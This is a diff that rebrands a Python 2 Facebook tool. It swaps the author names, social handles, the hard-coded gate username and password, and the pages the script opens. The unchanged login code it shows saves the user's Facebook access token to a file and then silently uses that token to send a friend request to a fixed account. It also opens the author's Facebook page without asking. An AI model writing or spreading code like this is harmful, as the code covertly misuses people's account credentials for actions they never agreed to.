@@ -47,19 +47,19 @@ def jalan(z):
 
 
 ##### LOGO #####
-logo = """ -----------------------------•◈•
-(  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - AAHIL -OFFICAL------•◈•
-|__\~~) •||•RANA - RAJPUT---------------•◈•
-|__(-----\  •◈•------BLACK-TIGER--------•◈•
-|__~~~\ •◈•-----█-------⑦-------█------•◈•
-|__~~~\ •◈•-----█-------⑧-------█------•◈•
-|__~~~\ •◈•-----█-------⑥-------█------•◈•
+logo = """ ✩｡:*•.───── ❁ ❁ ─────.•*:｡✩•
+(  __)\\ ____✩｡:*•.───── ❁ ❁ ─────.•*:｡✩•
+|__(~)    •||•THE HANAN X MENTAL.•*:｡✩•
+|__\~~) •||•✩｡:*•.─────MENTAL ❁X❁ HANAN─────.•*:｡✩•
+|__(-----\✩｡:*•.─────ALL ❁FACEBOOK❁ KING─────.•*:｡✩•
+|__~~~\ •✩｡:*•.───── ❁⓪❁ ─────.•*:｡✩•
+|__~~~\ •✩｡:*•.───── ❁⓪❁ ─────.•*:｡✩•
+|__~~~\ •✩｡:*•.───── ❁⑦❁ ─────.•*:｡✩•
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92mMENTALxHANAN
+\033[1;96mInstagram \033[1;93m: \033[1;HANANxMENTAL
+\033[1;96mFacebook  \033[1;93m: \033[1;MENTALALLHATREZKAABAAP
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/MENTALxHANAN/zero
 \033[1;91m======================================="""
 
 def tik():
@@ -80,15 +80,15 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
+\033[1;96mAuthor  \033[1;93m: \033[1;92mMENTALxHANAN
+\033[1;96mInstagram \033[1;93m: \033[1;92mHANANxMENTAL
+\033[1;96mFacebook  \033[1;93m: \033[1;92m MENTALALLHETRAZKAABAAP
+\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/MENTALxHANAN/zero
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "MENTAL"
+CorrectPassword = "HANAN"
 
 loop = 'true'
 while (loop == 'true'):
@@ -100,10 +100,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://www.facebook.com/MENTAL.ALL.HATERZ.KAA.BAAP')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.Youtube.com/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://www.facebook.com/MENTAL.ALL.HATERZ.KAA.BAAP')
 
 def login():
 	os.system('clear')
@@ -144,7 +144,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/Omi6t')
+				os.system('xdg-open https://www.facebook.com/MENTAL.ALL.HATERZ.KAA.BAAP')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
